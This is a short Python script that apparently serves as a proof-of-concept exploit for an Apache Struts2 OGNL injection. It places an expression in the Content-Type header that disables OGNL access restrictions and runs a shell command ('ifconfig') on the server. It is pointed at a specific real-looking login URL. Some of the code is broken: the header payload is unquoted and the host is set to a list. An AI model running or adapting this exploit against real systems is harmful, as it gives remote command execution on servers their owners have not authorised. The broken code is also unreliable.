#! /usr/bin/env python
# encoding:utf-8
import urllib2
import sys
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers
import ssl
if hasattr(ssl, '_create_unverified_context'):
    ssl._create_default_https_context = ssl._create_unverified_context

def poc(url,host):
    register_openers()
    datagen, header = multipart_encode({"image1": open("tmp.txt", "rb")})
    header1 ={
        "Host":host,
        "Connection":"keep-alive",
        "Refer":host,
        "Accept":"*/*",
        "X-Requested-With":"XMLHttpRequest",
        "Accept-Encoding":"deflate",
        "Accept-Language":"zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4",
        }
    header["User-Agent"]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    header["Content-Type"]=%{(#nike='multipart/form-data').
    (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
    (#_memberAccess?(#_memberAccess=#dm):
    ((#container=#context['com.opensymphony.xwork2.ActionContext.container']).
    (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
    (#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).
    (#context.setMemberAccess(#dm)))).(#cmd='ifconfig').
    (#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).
    (#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).
    (#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).
    (#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().
    getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).
    (#ros.flush())}

    request = urllib2.Request(url,datagen,headers=header)
    response = urllib2.urlopen(request)
    print response.read()

url = "https://antiml.core.yiji.com/TPPAML/login.do"#添加需要检测的网址
host = url.split("/")
poc(url,host)